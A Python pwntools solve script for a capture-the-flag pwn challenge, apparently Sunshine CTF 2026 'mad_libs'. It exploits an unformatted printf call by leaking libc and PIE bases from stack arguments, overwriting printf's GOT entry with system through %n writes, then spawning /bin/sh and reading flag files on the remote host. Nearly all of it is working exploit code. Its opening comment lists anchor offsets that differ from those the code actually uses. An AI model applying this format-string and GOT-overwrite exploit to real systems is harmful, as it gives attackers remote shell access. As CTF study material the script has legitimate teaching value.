#!/usr/bin/env python3
# Sunshine CTF 2026 - Pwn/mad_libs
#
# printf(user_buffer) with no format argument, eight times over. PIE + canary +
# Partial RELRO: the canary is irrelevant (we never touch the stack frame) and
# Partial RELRO leaves .got.plt writable, so one %n write is the whole exploit.
#
# The buffer lands exactly on positional arg 8, which makes it its own pointer
# array. Two args are stable anchors for the two bases we need:
#     arg3  = libc + 0x11ba61      -> libc base
#     arg47 = elf  + 0x1c9         (a saved return address) -> PIE base
# Then overwrite the LOW 3 BYTES of printf@got with system: bytes 3..7 are shared
# because both symbols live in the same libc, so two writes replace six and the
# payload stays well inside the buffer.
#
# printf's GOT slot is read at call time, so the call doing the write finishes
# normally; the NEXT printf(buffer) is already system(buffer).
import sys, re
from pwn import *

context.update(arch='amd64', log_level='info')
HOST, PORT   = 'chal.sunshinectf.games', 26001
# Anchors must live on the STACK, not in a register. arg1-arg5 are rsi/rdx/rcx/r8/r9
# at call time and hold leftovers from the preceding fgets, so they shift with input
# length -- arg3 looked like a stable libc pointer and was not. These two are saved
# return addresses and were identical across repeated runs.
LIBC_ANCHOR  = (43, 0x2a1ca)      # __libc_start_call_main+0x7a
ELF_ANCHOR   = (47, 0x11c9)       # return address inside the binary
FMT_OFFSET   = 8                  # buffer starts exactly at positional arg 8

remote_mode = len(sys.argv) > 1 and sys.argv[1] == 'remote'
io   = remote(HOST, PORT) if remote_mode else process('./mad_libs_patched')
elf  = ELF('./mad_libs', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def round_(payload):
    io.recvuntil(b'> ')
    io.sendline(payload)
    return io.recvline()

# ---- 1. one round buys both bases.
line = round_(f'%{LIBC_ANCHOR[0]}$p|%{ELF_ANCHOR[0]}$p'.encode())
lo, eo = [int(v, 16) for v in line.decode().strip().split('|')]
libc.address = lo - LIBC_ANCHOR[1]
elf.address  = eo - ELF_ANCHOR[1]
log.success(f'libc base = {libc.address:#x}')
log.success(f'elf  base = {elf.address:#x}')
assert libc.address & 0xfff == 0, f'libc base {libc.address:#x} not page-aligned'
assert elf.address  & 0xfff == 0, f'elf base {elf.address:#x} not page-aligned'

printf_got = elf.got['printf']
system     = libc.symbols['system']
printf     = libc.symbols['printf']
log.info(f'printf@got = {printf_got:#x}  printf = {printf:#x}  system = {system:#x}')

# Only the low 3 bytes may differ; if a carry crosses byte 3 we must write more.
assert system >> 24 == printf >> 24, 'system/printf differ above byte 3 - widen the write'

# ---- 2. two %n writes patch printf@got into system.
payload = fmtstr_payload(FMT_OFFSET, {printf_got: p64(system)[:3]}, write_size='byte')
assert len(payload) < 200, f'payload {len(payload)}B too long for the buffer'
log.info(f'fmtstr payload: {len(payload)} bytes')
round_(payload)
log.success('printf@got -> system')

# ---- 3. the next printf(buffer) is system(buffer).
io.recvuntil(b'> ', timeout=2)
io.sendline(b'/bin/sh')
io.recvrepeat(0.5)
io.sendline(b'cat flag*.txt flag* 2>/dev/null; ls')
out = io.recvrepeat(2).decode('latin1')
print(out)
m = re.search(r'sun\{[^}]*\}', out)
if m:
    log.success(f'FLAG: {m.group(0)}')
else:
    io.interactive()
